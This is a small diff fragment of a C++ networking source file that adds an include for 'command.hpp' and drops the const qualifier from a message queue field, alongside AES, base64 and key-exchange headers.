@@ -32,6 +32,7 @@ bFeYQXk8IEGuTHRLM3CpYJxIJgD5PFfFmBMV1p+O5IOR3T2J+R+03V1JImYDOG0f
 #include"OblivionisAES.hpp"
 #include"base64.hpp"
 #include"KeyExchange.hpp"
+#include"command.hpp"
 #pragma comment(lib, "ws2_32.lib")
 
 struct OblivionisConfig{
@@ -47,7 +48,7 @@ struct OblivionisConfig{
 };
 
 typedef struct {
-    const char *message;
+    char *message;
     void *next;
 } *Queue;
 
